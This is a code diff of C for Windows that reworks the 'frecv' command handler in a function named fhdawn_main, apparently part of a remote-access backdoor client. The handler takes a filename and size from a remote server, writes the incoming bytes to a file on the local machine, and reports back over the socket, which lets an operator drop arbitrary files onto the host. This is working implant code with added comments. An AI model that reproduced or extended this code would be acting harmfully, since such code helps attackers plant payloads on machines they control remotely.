@@ -68,47 +68,44 @@ void fhdawn_main(void)
         // TODO: Fix notify bug
         else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
         {
-            memset(recvbuf, '\0', BUFFER);
-            int fsize = 0;
-            int expected = 0;
-            char * fileinfo[2];
-            DWORD dwBytesWritten = 0;
-            BOOL write;
-            // Receive Filename and Filesize.
-            // Format is filename.txt:filesizeinbytes.
-            // Split using ':' delimieter
-            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
-            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            int fsize = 0; // return value for recv
+            int expected = 0; // expected bytes of size
+            char  temp[BUFFER]; // Temporary buffer to receive file information
+            char* fileinfo[2]; // to Store file information seperatley
+            DWORD dwBytesWritten = 0; // number of bytes written
+            BOOL write; // Return value of WriteFile();
+
+            memset(temp, '\0', BUFFER); // Clear temp
+            int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) 
             {
                 connected = FALSE;
             }
-            split(recvbuf, fileinfo, ":");
-            expected = atoi(fileinfo[1]);
+            split(temp, fileinfo, ":"); // split the received string with ':' delimeter. So at index 0, There is filename, And at index 1, There is filesize.
+            expected = atoi(fileinfo[1]); // Convert filesize to integer. Filesize is the expected file size.
             // Create file.
             HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
             if(recvfile == INVALID_HANDLE_VALUE){
                 sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
             } else {
-                // Start receiving file
-                // once again clear recvbuf
-                memset(recvbuf, '\0', BUFFER);
-                int total = 0;
+                memset(recvbuf, '\0', BUFFER); // Clear main buffer
+                int total = 0; // Total bytes received
                 do {
-                    fsize = recv(sockfd, recvbuf, BUFFER, 0 );
+                    fsize = recv(sockfd, recvbuf, BUFFER, 0 ); // Receive file
                     if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                     {
                         connected = FALSE;
                         printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                     }
-                    write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL);
-                    total += fsize;
-                } while(total != expected);
+                    write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
+                    total += fsize; // Add number of bytes received to total.
+                } while(total != expected); // IF Total is equal to expected bytes. Break the loop, And stop receiving.
 
                 if(write == FALSE)
                 {
                     sockprintf(sockfd,"[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                 } else {
-                    sockprintf(sockfd,"[ Received File : %s]\n[ File Size : %s  ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                    sockprintf(sockfd,"\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %lu ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                 }
                 CloseHandle(recvfile);
             }
